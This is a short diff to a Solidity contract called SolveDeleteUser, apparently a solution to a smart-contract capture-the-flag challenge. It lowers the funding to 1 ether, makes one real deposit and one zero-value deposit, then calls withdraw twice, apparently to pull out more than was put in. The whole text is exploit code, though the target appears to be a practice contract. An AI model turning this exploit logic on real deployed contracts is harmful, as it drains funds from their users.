@@ -4,10 +4,10 @@ import "./DeleteUser.sol";
 
 contract SolveDeleteUser {
     constructor(DeleteUser instance) payable {
-        require(msg.value == 3 ether, "3 ethers are required");
+        require(msg.value == 1 ether, "1 ether is required");
 
-        instance.deposit{value: 2 ether}();
         instance.deposit{value: 1 ether}();
+        instance.deposit{value: 0}();
 
         instance.withdraw(1);
         instance.withdraw(1);
